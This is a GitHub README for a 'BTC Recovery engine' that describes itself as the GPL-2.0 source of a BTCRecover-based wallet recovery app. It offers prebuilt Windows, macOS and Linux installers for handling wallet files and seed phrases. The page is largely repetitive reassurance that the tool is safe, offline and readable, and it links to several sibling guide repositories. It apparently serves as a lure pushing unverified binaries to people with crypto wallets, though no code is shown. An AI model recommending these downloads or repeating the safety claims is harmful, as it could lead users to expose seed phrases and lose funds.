<div align="center">
<img src="assets/banner-app.png" alt="BTC Recovery engine">
</div>

<h1 align="center">BTC Recovery engine</h1>

<p align="center">The BTCRecover codebase this application is built on, under GPL-2.0.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

The source behind the published build is readable before you run it.

> Only download from this GitHub release page.

## What this repository is for

BTC Recovery is built on BTCRecover, the long-running open-source wallet recovery tool, and this repository holds the engine source that the application is compiled from. The licence is GPL-2.0, the same as the application, so everything the installed program does can be read here before it is trusted with a wallet file. Keeping the engine in its own repository is deliberate: the application repository publishes releases and installers, and this one holds the code those releases are built from. If you are deciding whether to trust a recovery tool with a phrase or a password, reading the engine is the strongest check available, and the safety guide explains the others. The engine's own tests and history stay with it, which is also why a reader comparing the installer with the source can see exactly what changed between builds.

## Who it is for

- You want to read the code before running it against a wallet.
- You are checking whether a wallet format you hold is handled by this engine.
- You are building the application from source rather than installing it.

## Start here

- The safety guide explains the checks that matter before a first run.
- The tool overview names the wallet types the engine targets.
- The first-run walkthrough covers a single wallet end to end.

## How to use these guides

1. Read the licence before redistributing anything built from this source.
2. Compare the engine's version with the release notes of the installer you downloaded.
3. Use the guides rather than the source for the option names you need day to day.

## The guides, grouped

Four pages explain what the engine is asked to do.

| Guide | What it answers |
| --- | --- |
| [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) | BTCRecover is free, open-source software that runs offline and needs nothing sent anywhere, which makes it safe in the way that matters for a recovery tool. |
| [Bitcoin wallet recovery tool: what it does and when it works](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-bitcoin-wallet-recovery-tool.md) | It runs offline on Windows, macOS and Linux, works on the file or phrase you already hold, and sends nothing anywhere. |
| [How to use BTCRecover: first run walkthrough](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/how-to-use-btcrecover.md) | Get those right and the command is short; get one wrong and the run is silent, which is the part that costs people a weekend. |
| [Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md) | BTCRecover works on local wallet files and seed phrases of the formats it supports, not on every wallet that exists. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| A recovery that needs a plan | The seed phrase guides | A search small enough to run, checked against one address. |
| A wallet file with no password | The wallet file guides | Candidates tested against a copy of the file, offline. |
| A download you want to check | The tool guides | The published checksum and the file that matches it. |

## Common first questions

### Is this the same code as the installer?

Yes. The release is built from this engine, and the licence requires that the source stays available.

### Can I use this in my own project?

GPL-2.0 allows it with the same licence and the same source obligations. Read the licence file rather than a summary of it.

### Why publish the source separately from the installer?

Because the licence requires the source to stay available, and because a recovery tool should be readable before it is trusted with a phrase.

## Before you install

Check the licence before you redistribute anything built from this source, and check the release notes before you assume this engine matches the installer you downloaded. The application repository is where the published build lives. Reading the source is the strongest check a reader can make on a tool like this, and the safety guide lists the others in the order that matters.

## About

BTC Recovery ships as a built application, and this repository is the engine it is built from. Separating them keeps the release page about releases and this page about the code, which is what a reader who wants to check the implementation is actually looking for. Read the engine before you hand it a wallet file, because the source is the one claim on this account a reader can check line by line.

## License

The engine keeps the GPL-2.0 licence it came with; [LICENSE](LICENSE) holds the whole text.

---

**BTC Recovery engine** - one page of the BTC Recovery account.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
